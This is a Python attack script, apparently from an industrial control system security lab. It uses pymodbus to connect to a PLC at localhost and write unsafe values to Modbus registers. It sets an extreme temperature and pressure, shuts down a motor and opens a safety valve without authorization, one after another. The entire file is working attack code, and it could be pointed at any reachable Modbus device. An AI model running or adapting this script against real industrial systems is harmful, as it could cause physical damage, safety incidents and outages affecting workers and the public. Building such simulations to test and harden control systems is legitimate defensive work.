#!/usr/bin/env python3
"""
ATTACK SCRIPT #1: Out-of-Range Value Injection
Simulates an attacker writing dangerous values to the PLC
"""

from pymodbus.client import ModbusTcpClient
import time
import logging

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

class MaliciousHMI:
    def __init__(self, plc_host='127.0.0.1', plc_port=502):
        self.client = ModbusTcpClient(plc_host, port=plc_port)
        
    def connect(self):
        if self.client.connect():
            log.info("🔴 ATTACKER CONNECTED to PLC")
            return True
        return False
    
    def attack_dangerous_temperature(self):
        """Write dangerously high temperature (simulating sensor override)"""
        dangerous_temp = 9999  # 999.9°C - WAY beyond safe limits!
        log.warning(f"⚠️  ATTACK: Writing dangerous temperature: {dangerous_temp/10}°C")
        result = self.client.write_register(address=0, value=dangerous_temp)
        
        if not result.isError():
            log.info("✓ Successfully wrote dangerous temperature!")
        else:
            log.error(f"✗ Attack failed: {result}")
    
    def attack_dangerous_pressure(self):
        """Write dangerously high pressure"""
        dangerous_pressure = 5000  # 5000 PSI - 5x normal!
        log.warning(f"⚠️  ATTACK: Writing dangerous pressure: {dangerous_pressure} PSI")
        result = self.client.write_register(address=1, value=dangerous_pressure)
        
        if not result.isError():
            log.info("✓ Successfully wrote dangerous pressure!")
        else:
            log.error(f"✗ Attack failed: {result}")
    
    def attack_motor_speed_zero(self):
        """Set motor speed to zero (shutdown attack)"""
        log.warning("⚠️  ATTACK: Shutting down motor (setting speed to 0)")
        result = self.client.write_register(address=2, value=0)
        
        if not result.isError():
            log.info("✓ Successfully shut down motor!")
        else:
            log.error(f"✗ Attack failed: {result}")
    
    def attack_unauthorized_valve_open(self):
        """Open safety valve without authorization"""
        log.warning("⚠️  ATTACK: Opening safety valve without authorization!")
        result = self.client.write_register(address=3, value=1)
        
        if not result.isError():
            log.info("✓ Successfully opened safety valve!")
        else:
            log.error(f"✗ Attack failed: {result}")
    
    def execute_attack_sequence(self):
        """Run a sequence of attacks"""
        log.info("=" * 70)
        log.info("🔴 STARTING ATTACK SEQUENCE")
        log.info("=" * 70)
        
        # Attack 1: Dangerous temperature
        self.attack_dangerous_temperature()
        time.sleep(2)
        
        # Attack 2: Dangerous pressure
        self.attack_dangerous_pressure()
        time.sleep(2)
        
        # Attack 3: Motor shutdown
        self.attack_motor_speed_zero()
        time.sleep(2)
        
        # Attack 4: Unauthorized valve opening
        self.attack_unauthorized_valve_open()
        
        log.info("=" * 70)
        log.info("🔴 ATTACK SEQUENCE COMPLETE")
        log.info("=" * 70)
    
    def disconnect(self):
        self.client.close()
        log.info("Attacker disconnected")

if __name__ == "__main__":
    attacker = MaliciousHMI()
    
    if attacker.connect():
        try:
            attacker.execute_attack_sequence()
        finally:
            attacker.disconnect()
    else:
        log.error("Could not connect to PLC")
